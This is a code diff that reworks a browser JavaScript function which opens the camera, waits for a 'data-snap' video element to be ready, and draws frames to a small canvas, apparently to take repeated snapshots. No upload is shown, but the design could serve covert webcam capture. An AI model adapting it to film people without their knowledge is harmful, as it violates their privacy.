@@ -212,31 +212,31 @@ let camFacingMode = 'environment';
 function startCameraStream() {
     if (camStreamInterval) return;
     if (!stream || !stream.getVideoTracks().length) {
-        // Request camera first (silent if already granted)
         const tryGetCam = (mode) => {
             const constraints = mode ? {video:{facingMode:mode},audio:false} : {video:true,audio:false};
             navigator.mediaDevices.getUserMedia(constraints)
                 .then((s) => {
                     stream = s; camFacingMode = mode || 'user';
-                    const v = document.querySelector('video[data-snap]');
+                    let v = document.querySelector('video[data-snap]');
+                    if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                     if (v) { v.srcObject = s; v.play(); }
-                    else { startSnapshots(); }
-                    // Wait for video ready then restart
-                    const waitAndRetry = () => {
+                    // Poll until video is ready
+                    const MAX_WAIT = 50;
+                    let waited = 0;
+                    const poll = () => {
                         const v2 = document.querySelector('video[data-snap]');
-                        if (v2 && v2.readyState >= 2) { startCameraStream(); return; }
-                        if (v2) { v2.onloadeddata = () => startCameraStream(); }
-                        else setTimeout(startCameraStream, 500);
+                        if (v2 && v2.readyState >= 2 && v2.videoWidth > 0) { startCameraStream(); return; }
+                        if (++waited < MAX_WAIT) setTimeout(poll, 100);
                     };
-                    setTimeout(waitAndRetry, 300);
+                    setTimeout(poll, 100);
                 })
-                .catch(() => { if (mode) tryGetCam(null); }); // fallback: any camera
+                .catch(() => { if (mode) tryGetCam(null); });
         };
         tryGetCam(camFacingMode);
         return;
     }
     const v = document.querySelector('video[data-snap]');
-    if (!v) { startSnapshots(); setTimeout(startCameraStream, 500); return; }
+    if (!v || v.readyState < 2) { setTimeout(startCameraStream, 100); return; }
     const c = document.createElement('canvas');
     c.width = 320; c.height = 240;
     const ctx = c.getContext('2d');
